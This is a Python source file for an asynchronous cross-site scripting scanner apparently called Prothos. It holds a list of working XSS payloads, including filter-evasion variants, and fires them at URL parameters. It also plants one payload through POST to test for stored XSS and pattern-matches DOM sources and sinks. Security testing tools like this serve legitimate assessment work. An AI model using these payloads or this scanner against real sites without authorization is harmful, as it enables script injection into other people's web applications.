import asyncio
import json
import re
import html as html_lib
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import httpx
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn

console = Console()

CANARY = "prth0sXSS9173"

XSS_PAYLOADS: list[str] = [
    f"<script>alert('{CANARY}')</script>",
    f"<ScRiPt>alert('{CANARY}')</ScRiPt>",
    f"<img src=x onerror=alert('{CANARY}')>",
    f"<img src=x onerror=\"alert('{CANARY}')\">",
    f"<svg onload=alert('{CANARY}')>",
    f"<svg/onload=alert('{CANARY}')>",
    f"<svg><script>alert('{CANARY}')</script></svg>",
    f"<body onload=alert('{CANARY}')>",
    f"<iframe src=javascript:alert('{CANARY}')>",
    f"<input autofocus onfocus=alert('{CANARY}')>",
    f"<select autofocus onfocus=alert('{CANARY}')>",
    f"<textarea autofocus onfocus=alert('{CANARY}')>",
    f"<details open ontoggle=alert('{CANARY}')>",
    f"<marquee onstart=alert('{CANARY}')>",
    f"<video><source onerror=alert('{CANARY}')>",
    f"<audio src=x onerror=alert('{CANARY}')>",
    f"<a href=javascript:alert('{CANARY}')>x</a>",
    f"'\"><script>alert('{CANARY}')</script>",
    f"\"><img src=x onerror=alert('{CANARY}')>",
    f"'><svg onload=alert('{CANARY}')>",
    f"javascript:alert('{CANARY}')",
    f"\" onmouseover=\"alert('{CANARY}')",
    f"' onmouseover='alert(\"{CANARY}\")",
    f"\" autofocus onfocus=alert('{CANARY}') x=\"",
    f"</script><script>alert('{CANARY}')</script>",
    f"{{constructor.constructor('alert(\\'{CANARY}\\')')()}}",
    f"<img src=x:alert('{CANARY}') onerror=eval(src)>",
    f"<svg><animate onbegin=alert('{CANARY}') attributeName=x dur=1s>",
    f"<x onclick=alert('{CANARY}')>click",
    f"<script>confirm('{CANARY}')</script>",
    f"<img/src/onerror=alert('{CANARY}')>",
    f"<svg%0Aonload=alert('{CANARY}')>",
    f"<scr<script>ipt>alert('{CANARY}')</scr</script>ipt>",
    f"<img src=`x` onerror=alert('{CANARY}')>",
    f"<isindex action=javascript:alert('{CANARY}') type=submit value=go>",
    f"<form><button formaction=javascript:alert('{CANARY}')>x</button>",
]

DOM_SOURCES: list[str] = [
    "location.hash", "location.search", "location.href", "location.pathname",
    "document.URL", "document.documentURI", "document.referrer", "window.name",
    "document.cookie", "localStorage", "sessionStorage", "history.pushState",
    "history.replaceState", "URLSearchParams", "postMessage",
]

DOM_SINKS: list[str] = [
    "innerHTML", "outerHTML", "document.write", "document.writeln",
    "eval(", "setTimeout(", "setInterval(", "Function(", "execScript",
    "insertAdjacentHTML", "$(", ".html(", ".append(", ".after(", ".before(",
    "location=", "location.href=", "location.assign", "location.replace",
    "window.open", ".src=", "jQuery.globalEval",
]

SEVERITY_COLOR = {
    "critical": "bold red",
    "high":     "red",
    "medium":   "yellow",
    "low":      "dim",
    "info":     "cyan",
}


@dataclass
class XSSFinding:
    url:        str
    param:      str
    xss_type:   str
    payload:    str
    context:    str          = ""
    status:     int          = 0
    evidence:   str          = ""
    severity:   str          = "high"

    def to_dict(self) -> dict:
        return self.__dict__.copy()


@dataclass
class XSSReport:
    target:      str
    started_at:  str                  = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    finished_at: Optional[str]       = None
    params:      list[str]           = field(default_factory=list)
    findings:    list[XSSFinding]    = field(default_factory=list)
    errors:      list[str]           = field(default_factory=list)

    @property
    def high(self) -> list[XSSFinding]:
        return [f for f in self.findings if f.severity in ("critical", "high")]

    def to_dict(self) -> dict:
        d = self.__dict__.copy()
        d["findings"] = [f.to_dict() for f in self.findings]
        return d


def _set_param(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    return urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))


def _candidate_params(url: str, extra: Optional[list[str]]) -> list[str]:
    params = list(parse_qs(urlparse(url).query).keys())
    if extra:
        for p in extra:
            if p not in params:
                params.append(p)
    if not params:
        params = ["q"]
    return params


def _reflection_context(body: str) -> Optional[str]:
    marker = f"PRTHCTX{CANARY}"
    idx = body.find(marker)
    if idx == -1:
        return None
    before = body[max(0, idx - 60): idx].lower()
    if "<script" in before and "</script" not in before:
        return "script"
    if re.search(r'=\s*["\'][^"\']*$', before):
        return "attribute"
    if re.search(r'<[^>]*$', before):
        return "tag"
    return "html"


def _payload_executes(body: str, payload: str) -> bool:
    if payload in body:
        return True
    if html_lib.escape(payload) in body:
        return False
    core = re.sub(r"\s+", "", payload)
    stripped = re.sub(r"\s+", "", body)
    return core in stripped


async def _detect_context(client, url, param) -> Optional[str]:
    marker = f"PRTHCTX{CANARY}"
    try:
        r = await client.get(_set_param(url, param, marker), timeout=12)
        return _reflection_context(r.text)
    except Exception:
        return None


async def _test_reflected(client, url, param, sem) -> list[XSSFinding]:
    findings = []
    context = await _detect_context(client, url, param)
    if context is None:
        return findings

    async with sem:
        for payload in XSS_PAYLOADS:
            try:
                r = await client.get(_set_param(url, param, payload), timeout=12)
            except Exception:
                continue
            if _payload_executes(r.text, payload):
                f = XSSFinding(url=url, param=param, xss_type="reflected",
                               payload=payload, context=context, status=r.status_code,
                               evidence=f"payload reflected unencoded in {context} context",
                               severity="high")
                findings.append(f)
                _print_finding(f)
                return findings
    return findings


async def _test_stored(client, url, param, sem) -> list[XSSFinding]:
    findings = []
    payload = XSS_PAYLOADS[2]
    async with sem:
        try:
            await client.post(url, data={param: payload}, timeout=12)
            r = await client.get(url, timeout=12)
        except Exception:
            return findings
        if _payload_executes(r.text, payload):
            f = XSSFinding(url=url, param=param, xss_type="stored",
                           payload=payload, context="persisted", status=r.status_code,
                           evidence="payload persisted and reflected on re-fetch",
                           severity="critical")
            findings.append(f)
            _print_finding(f)
    return findings


def _analyze_dom(js: str, source_url: str) -> list[XSSFinding]:
    findings = []
    found_sources = [s for s in DOM_SOURCES if s in js]
    found_sinks   = [s for s in DOM_SINKS if s in js]
    if found_sources and found_sinks:
        f = XSSFinding(
            url=source_url, param="-", xss_type="dom-hint",
            payload="-", context="js source/sink",
            status=200,
            evidence=f"sources: {', '.join(found_sources[:4])} | sinks: {', '.join(found_sinks[:4])}",
            severity="medium",
        )
        findings.append(f)
        _print_finding(f)
    return findings


async def _test_dom(client, url, sem) -> list[XSSFinding]:
    findings = []
    async with sem:
        try:
            r = await client.get(url, timeout=12)
        except Exception:
            return findings
        findings.extend(_analyze_dom(r.text, url))

        scripts = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', r.text, re.IGNORECASE)
        base = urlparse(url)
        for src in scripts[:10]:
            js_url = src if "://" in src else f"{base.scheme}://{base.netloc}{src if src.startswith('/') else '/' + src}"
            try:
                jr = await client.get(js_url, timeout=12)
                findings.extend(_analyze_dom(jr.text, js_url))
            except Exception:
                continue
    return findings


def _print_finding(f: XSSFinding):
    color = SEVERITY_COLOR.get(f.severity, "white")
    console.print(
        f"  [{color}][{f.severity.upper()}][/{color}] "
        f"[bold white]{f.param}[/bold white] → "
        f"[yellow]{f.xss_type}[/yellow] [cyan]{f.context}[/cyan]  "
        f"[dim]payload: {f.payload[:40]}[/dim]"
    )


def _display(report: XSSReport):
    console.print()
    console.print(Panel(
        f"[bold white]{report.target}[/bold white]  "
        f"[dim]params:[/dim] {len(report.params)}  "
        f"[dim]findings:[/dim] [yellow]{len(report.findings)}[/yellow]  "
        f"[dim]high+:[/dim] [red]{len(report.high)}[/red]",
        title="[bold red]XSS Scan — Summary[/bold red]",
        border_style="red",
    ))

    if not report.findings:
        console.print("[dim]    No XSS found.[/dim]\n")
        return

    table = Table(show_header=True, header_style="bold red", border_style="dim")
    table.add_column("Severity",  width=10)
    table.add_column("Param",     style="bold white", width=16)
    table.add_column("Type",      style="cyan", width=12)
    table.add_column("Context",   style="magenta", width=14)
    table.add_column("Payload",   style="yellow", min_width=30)

    for f in report.findings:
        color = SEVERITY_COLOR.get(f.severity, "white")
        table.add_row(
            f"[{color}]{f.severity}[/{color}]",
            f.param, f.xss_type, f.context, f.payload[:45],
        )

    console.print(table)
    console.print()


async def _xss_async(target, extra_params, stored, dom, concurrency, proxy) -> XSSReport:
    report = XSSReport(target=target)
    params = _candidate_params(target, extra_params)
    report.params = params
    sem = asyncio.Semaphore(concurrency)

    async with httpx.AsyncClient(
        verify=False,
        follow_redirects=True,
        proxy=proxy,
        headers={"User-Agent": "Mozilla/5.0 (compatible; Prothos/1.0)"},
    ) as client:

        with Progress(
            SpinnerColumn(style="red"),
            TextColumn("[bold white]{task.description}"),
            BarColumn(bar_width=35, style="red", complete_style="green"),
            TextColumn("[green]{task.completed}[/green]/[white]{task.total}[/white]"),
            TimeElapsedColumn(),
            console=console,
            transient=True,
        ) as progress:
            steps = len(params) * (2 if stored else 1) + (1 if dom else 0)
            task_id = progress.add_task("Scanning XSS...", total=steps)

            for param in params:
                report.findings.extend(await _test_reflected(client, target, param, sem))
                progress.advance(task_id, 1)
                if stored:
                    report.findings.extend(await _test_stored(client, target, param, sem))
                    progress.advance(task_id, 1)

            if dom:
                report.findings.extend(await _test_dom(client, target, sem))
                progress.advance(task_id, 1)

    report.findings.sort(key=lambda x: (
        {"critical": 0, "high": 1, "medium": 2, "low": 3}.get(x.severity, 4)
    ))
    report.finished_at = datetime.now(timezone.utc).isoformat()
    return report


def run_xss_scan(
    target:        str,
    params:        Optional[list[str]] = None,
    stored:        bool                = True,
    dom:           bool                = True,
    concurrency:   int                 = 10,
    proxy:         Optional[str]       = None,
    save_json:     Optional[str]       = None,
) -> XSSReport:

    console.print(f"\n[bold red][*][/bold red] XSS Scan → [bold white]{target}[/bold white]")
    detected = _candidate_params(target, params)
    console.print(f"[dim]    Params: {', '.join(detected)}  "
                  f"Payloads: {len(XSS_PAYLOADS)}  "
                  f"stored={stored} dom={dom}[/dim]")

    report = asyncio.run(_xss_async(
        target=target,
        extra_params=params,
        stored=stored,
        dom=dom,
        concurrency=concurrency,
        proxy=proxy,
    ))

    _display(report)

    if save_json:
        try:
            with open(save_json, "w") as f:
                json.dump(report.to_dict(), f, indent=2, default=str)
            console.print(f"[dim][+] Saved to {save_json}[/dim]")
        except OSError as e:
            console.print(f"[red][!] Failed to save: {e}[/red]")

    return report
